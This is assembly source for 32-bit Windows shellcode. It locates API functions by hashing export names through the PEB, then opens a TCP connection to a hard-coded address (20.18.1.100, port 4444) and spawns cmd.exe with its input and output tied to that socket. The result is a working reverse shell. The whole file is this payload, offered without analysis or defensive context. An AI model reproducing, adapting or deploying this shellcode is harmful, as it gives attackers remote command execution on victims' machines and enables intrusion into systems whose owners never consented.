[bits 32]
org DEF_ADDRESS
segment .text
start:
    cld
    jmp short main

api_call:
    pushad
    xor eax, eax
    mov eax, [fs:eax+30h]   ; PEB
    mov eax, [eax+0x0c]      ; Ldr
    mov esi, [eax+0x14]      ; InMemoryOrderModuleList
next_mod:
    lodsd                   ; next _LDR_DATA_TABLE_ENTRY
    mov [esp+1ch], eax      ; store eax
    mov ebp, [eax+10h]      ; DllBase
    mov eax, [ebp+3ch]      ; IMAGE_DOS_HEADER.e_lfanew
    mov edx, [ebp+eax+78h]  ; IMAGE_EXPORT_DIRECTORY
    add edx, ebp
    mov ecx, [edx+18h]      ; NumberOfNames
    mov ebx, [edx+20h]      ; AddressOfNames
    add ebx, ebp
next_name:                  ; while (--NumberOfNames)
    jecxz name_not_found
    dec ecx
    mov esi, [ebx+ecx*4]    ; ptr = AddressOfNames[NumberOfNames]
    add esi, ebp
    xor edi, edi            ; hash = 0
    xor eax, eax
compute_hash_loop:          ; while ((c = *(ptr++)) != 0)
    lodsb
    test al, al
    jz compare_hash
    ror edi, 0dh            ; hash += ror(c, 0x0d)
    add edi, eax
    jmp compute_hash_loop
compare_hash:
    cmp edi, [esp+24h]      ; compare with api hash
    jnz next_name
    mov ebx, [edx+24h]      ; AddressOfNameOrdinals
    add ebx, ebp
    mov cx, [ebx+ecx*2]     ; y = AddressOfNameOrdinals[x]
    mov ebx, [edx+1ch]      ; AddressOfFunctions
    add ebx, ebp
    mov eax, [ebx+ecx*4]    ; AddressOfFunctions[y]
    add eax, ebp
    mov [esp+1ch], eax      ; store eax
    popad
    pop ecx                 ; remove api hash from the stack
    pop edx
    push ecx
    jmp eax                 ; jump to api function
name_not_found:
    mov esi, [esp+1ch]      ; update eax
    jmp next_mod

main:
  mov ax,0x6c6c
  movzx eax,ax
  push eax
  push 0x642e3233
  push 0x5f327377
  mov esi,esp
  push esi ; ws2_32.dll
  push 0xec0e4e8e ; LoadLibraryA
  call api_call
  sub  esp,0xFFFFFFF4 ; pop x3

  add esp,0xFFFFFDFE     ;WSAData addr
  mov esi,esp
  push esp	; WSADATA
  push 2  ;version
  push 0x3bfcedcb         ;WSAStartup
  call api_call
  sub esp,0xFFFFFDFE

  xor ebx, ebx
  push ebx
  push ebx
  push ebx
  push ebx
  push 1
  push 2
  push 0adf509d9h         ; WSASocketA
  call api_call
  xchg esi, eax ; socket

  xor eax,eax

  ; struct sockaddr stack layout
  ;4: 00025c11 = socktype + port number ( 0x115c network byteorder )
  ;3: 64011214 = ip address( 0x14120164 network byteorder )
  ;2: 00000000 = padding1 ( push eax )
  ;1: 00000000 = padding2 ( xor eax,eax - > push eax )

  push eax			; padd2
  push eax			; padd1
  push 0x64011214   ; ip address: 20.18.1.100 ( 0x14120164 )
  mov  ax,0x5c11		
  push ax			;  port: 4444 ( 0x115c )
  mov  al,2
  movzx ax,al	; zero extended
  push ax		; socktype(SOCK_STREAM): 2

  mov edi, esp  ;
  push 10h  ; sizeof( struct sockaddr )
  push edi  ; struct sockaddr*
  push esi  ; sock
  push 60aaf9ech          ; connect
  call api_call
  push 44h                ; STARTUPINFO
  pop ecx
  sub esp, ecx
  mov edi, esp
  push edi
  xor eax, eax
  rep stosb
  pop edi
  mov byte [edi], 44h
  inc byte [edi+2dh]
  push edi
  xchg esi, eax
  lea edi, [edi+38h]
  stosd
  stosd
  stosd
  pop edi
  lea esi, [edi+44h]      ; PROCESS_INFORMATION

  mov eax, 646d6301h      ; "cmd"
  sar eax, 8
  push eax
  mov eax, esp

  push esi
  push edi
  push ebx
  push ebx
  push ebx
  push 1
  push ebx
  push ebx
  push eax
  push ebx
  push 16b3fe72h          ; CreateProcessA
  call api_call

  push ebx
  push 73e2d87eh          ; ExitProcess
  call api_call